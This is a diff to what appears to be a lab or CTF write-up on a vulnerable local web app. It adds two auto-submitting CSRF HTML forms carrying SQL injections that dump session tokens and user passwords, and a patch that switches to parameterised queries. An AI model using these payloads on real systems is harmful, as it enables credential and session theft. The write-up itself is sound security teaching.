@@ -57,8 +57,36 @@ List of vulnerabilities discovered:
 
 ### CSRF
 
-how
-
+> Create `malicious.html` where a form calls the post method on an endpoint with an SQL injection as the message.
+> ```
+> <html>
+><body>
+>    <h1>CSRF Payload</h1>
+>    <form id="csrfForm" action="http://127.0.0.1:5000/posts" method="POST">
+>        <input type="hidden" name="message" value="1&#39;, 1&#41;, ((SELECT GROUP_CONCAT(user || ':' || token, '&#8249;br>') FROM sessions), 1)--">
+>    </form>
+>    <script>
+>        // Automatically submit the form when the page loads
+>        document.getElementById('csrfForm').submit();
+>    </script>
+></body>
+></html>
+> ```
+> or 
+> ```
+> <html>
+><body>
+>    <h1>CSRF Payload</h1>
+>    <form id="csrfForm" action="http://127.0.0.1:5000/posts" method="POST">
+>        <input type="hidden" name="message" value="1', 1&#41;, ((SELECT >GROUP_CONCAT(id || ',' || username || ':' || password, '&#8249;br>') FROM users), 1)--">
+>    </form>
+>    <script>
+>        // Automatically submit the form when the page loads
+>        document.getElementById('csrfForm').submit();
+>    </script>
+></body>
+></html>
+> ```
 ## Introduction
 
 Another month, another machine problem.
@@ -563,4 +591,17 @@ This vulnerability might give a hint to CSRF (Cross-Site Request Forgery) attack
 
 ## Patching the vulnerabilities
 
-change code bro
+To combat SQL injections, we changed how we pass values into the SQL queries from concatenation into input parametization, as shown below:
+```
+res = cur.execute("SELECT username FROM users INNER JOIN sessions ON "
+                              + "users.id = sessions.user WHERE sessions.token = '"
+                              + request.cookies.get("session_token") + "'")
+```
+
+into
+
+```
+res = cur.execute("SELECT username FROM users INNER JOIN sessions ON "
+                              + "users.id = sessions.user WHERE sessions.token = ?",
+                              (request.cookies.get("session_token"),))
+```
